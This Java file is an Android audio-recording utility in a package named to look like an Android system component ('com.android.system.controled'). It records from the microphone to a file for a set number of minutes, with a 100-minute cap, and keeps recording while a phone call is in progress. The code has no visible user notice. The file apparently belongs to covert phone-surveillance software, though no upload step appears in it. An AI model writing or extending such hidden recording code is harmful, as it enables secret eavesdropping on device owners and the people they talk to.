package com.android.system.controled.util;

import java.io.File;

import android.annotation.SuppressLint;
import android.content.Context;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;

import com.android.system.controled.Debug;
import com.android.system.controled.MainApplication;

@SuppressLint({ "Wakelock", "InlinedApi" })
public class RecorderUtil {

	private static RecorderUtil mRecorderUtil;
	private MediaRecorder mRecorder;
	private boolean isRecording;

	// private WakeLock wakeLock;
	private Context mContext;

	private Handler mHandler;
	private static final int MSG_HANDLER_STOP = 0x555;
	private static final int MSG_HANDLER_STOP_MAX_TIME = 0x556;

	private static final int RECORDER_MAX_TIME = 6000000;// 100 * 60 * 1000

	private RecorderUtil() {
	}

	public static RecorderUtil getInstence(Context context) {

		if (mRecorderUtil == null) {
			mRecorderUtil = new RecorderUtil();
			mRecorderUtil.mContext = context;
			mRecorderUtil.mRecorder = new MediaRecorder();
			// mRecorderUtil.wakeLock = ((PowerManager)
			// context.getSystemService(Context.POWER_SERVICE)).newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
			// "RecorderUtil_recorder");
		}

		return mRecorderUtil;
	}

	public boolean startRecorder(String saveFileName, int timeMinute) {

		if (isRecording) {
			Debug.e("", "正在录音，务须再录！");
			return false;
		}

		if (mRecorder == null) {
			mRecorder = new MediaRecorder();
		}

		String saveFilePath = "";
		boolean result = false;
		try {
			mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
			if (MainApplication.RECORDER_HIGH_QUALITY) {
				saveFilePath = saveFileName + ".3gpp";
				mRecorder.setAudioSamplingRate(44100);// 22050
				mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
				mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
			} else {
				saveFilePath = saveFileName + ".amr";
				mRecorder.setAudioSamplingRate(16000);// 8000
				mRecorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
				mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);// AMR_NB与16000对应 AMR_MB与8000对应
			}
			if (timeMinute > 0) {
				// mRecorder.setMaxDuration(timeMinute * 60 * 1000);
				if (mHandler == null) {
					mHandler = new Mainhandler();
				}
				mHandler.sendEmptyMessageDelayed(MSG_HANDLER_STOP, timeMinute * 60000);
				mHandler.sendEmptyMessageDelayed(MSG_HANDLER_STOP_MAX_TIME, RECORDER_MAX_TIME);
			}

			if (!(new File(saveFilePath)).getParentFile().exists()) {
				(new File(saveFilePath)).getParentFile().mkdirs();
			}
			if (!(new File(saveFilePath)).exists()) {
				(new File(saveFilePath)).createNewFile();
			}
			mRecorder.setOutputFile(saveFilePath);
			mRecorder.prepare();
			mRecorder.start();
			result = true;
			isRecording = true;
			// wakeLock.acquire();
			Debug.e("", "startRecorder=" + saveFilePath);
		} catch (Exception e) {
			result = false;
			isRecording = false;
			mHandler.removeMessages(MSG_HANDLER_STOP);
			mHandler.removeMessages(MSG_HANDLER_STOP_MAX_TIME);
			mRecorder.reset();
			mRecorder.release();
			mRecorder = null;
			// wakeLock.release();
			if ((new File(saveFilePath)).exists()) {
				(new File(saveFilePath)).delete();
			}
			e.printStackTrace();
		}

		return result;
	}

	public void stopRecorder() {
		Debug.e("RecorderUtil", "stopRecorder");
		if (mRecorder != null) {
			try {
				// if (wakeLock != null) {
				// wakeLock.release();
				// }
				isRecording = false;
				mRecorder.stop();
				mRecorder.reset();
				mRecorder.release();
				mRecorder = null;
			} catch (Exception e) {
				e.printStackTrace();
			}

			try {
				if (mHandler != null) {
					mHandler.removeMessages(MSG_HANDLER_STOP);
					mHandler.removeMessages(MSG_HANDLER_STOP_MAX_TIME);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

	}

	private class Mainhandler extends Handler {

		TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);

		@Override
		public void handleMessage(Message msg) {
			super.handleMessage(msg);
			switch (msg.what) {
			case MSG_HANDLER_STOP:

				if (tm.getCallState() == TelephonyManager.CALL_STATE_IDLE && isRecording) {
					stopRecorder();
				}
				break;
			case MSG_HANDLER_STOP_MAX_TIME:

				if (tm.getCallState() == TelephonyManager.CALL_STATE_IDLE && isRecording) {
					stopRecorder();
				}
				break;
			default:
				break;
			}
		}

	}

	// mRecorder.setOnInfoListener(new OnInfoListener() {
	//
	// @Override
	// public void onInfo(MediaRecorder mr, int what, int extra) {
	// switch (what) {
	// case MediaRecorder.MEDIA_RECORDER_INFO_UNKNOWN:
	// Debug.e("", "MediaRecorder.MEDIA_RECORDER_INFO_UNKNOWN");
	// break;
	// case MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED:
	// Debug.e("", "MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED");
	// break;
	// case MediaRecorder.MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED:
	// Debug.e("", "MediaRecorder.MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED");
	// break;
	// default:
	// break;
	// }
	//
	// }
	// });
}
